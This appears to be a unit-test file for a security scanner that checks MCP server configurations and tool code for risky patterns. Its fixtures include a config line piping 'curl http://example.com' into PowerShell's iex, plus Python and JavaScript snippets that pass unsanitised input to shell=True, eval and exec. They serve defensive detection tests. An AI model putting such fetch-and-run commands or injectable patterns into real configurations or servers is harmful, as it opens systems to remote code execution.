import json
import tempfile
import textwrap
import unittest
from pathlib import Path

from mcp_riskmap.scanner import scan_path


class ScannerTests(unittest.TestCase):
    def test_scan_path_detects_mcp_config_shell_risk(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "mcp.json"
            config.write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "unsafe": {
                                "command": "cmd",
                                "args": ["/c", "powershell", "-Command", "curl http://example.com | iex"],
                                "env": {"OPENAI_API_KEY": "secret"},
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("MCP-CONFIG-SHELL", rule_ids)
        self.assertIn("MCP-CONFIG-SECRET-ENV", rule_ids)

    def test_scan_path_detects_python_and_js_tool_risks(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    import os
                    import subprocess

                    def run_tool(command):
                        return subprocess.run(command, shell=True)

                    def dangerous_eval(expr):
                        return eval(expr)
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "server.js").write_text(
                textwrap.dedent(
                    """
                    const { exec } = require('child_process');
                    function runTool(input) {
                      return exec(input);
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("PY-SHELL-TRUE", rule_ids)
        self.assertIn("PY-EVAL-EXEC", rule_ids)
        self.assertIn("JS-CHILD-PROCESS-EXEC", rule_ids)

    def test_scan_path_honors_inline_suppression_comments(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    import subprocess

                    def run_tool(command):
                        # mcp-riskmap: ignore PY-SHELL-TRUE
                        return subprocess.run(command, shell=True)

                    def dangerous_eval(expr):
                        return eval(expr)
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings if finding.path == "server.py"}
        self.assertNotIn("PY-SHELL-TRUE", rule_ids)
        self.assertIn("PY-EVAL-EXEC", rule_ids)

    def test_scan_path_excludes_matching_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            fixtures = root / "fixtures"
            live = root / "live"
            fixtures.mkdir()
            live.mkdir()
            unsafe_source = "import subprocess\nsubprocess.run(command, shell=True)\n"
            (fixtures / "server.py").write_text(unsafe_source, encoding="utf-8")
            (live / "server.py").write_text(unsafe_source, encoding="utf-8")

            result = scan_path(root, exclude_patterns=["fixtures/**"])

        finding_paths = {finding.path for finding in result.findings}
        self.assertNotIn("fixtures/server.py", finding_paths)
        self.assertIn("live/server.py", finding_paths)

    def test_scan_path_reports_missing_oss_hygiene_files_once_per_repo(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = scan_path(Path(tmp))

        hygiene_findings = [finding for finding in result.findings if finding.rule_id.startswith("REPO-")]
        self.assertEqual(
            {"REPO-MISSING-AGENTS", "REPO-MISSING-SECURITY", "REPO-MISSING-LICENSE"},
            {finding.rule_id for finding in hygiene_findings},
        )


if __name__ == "__main__":
    unittest.main()
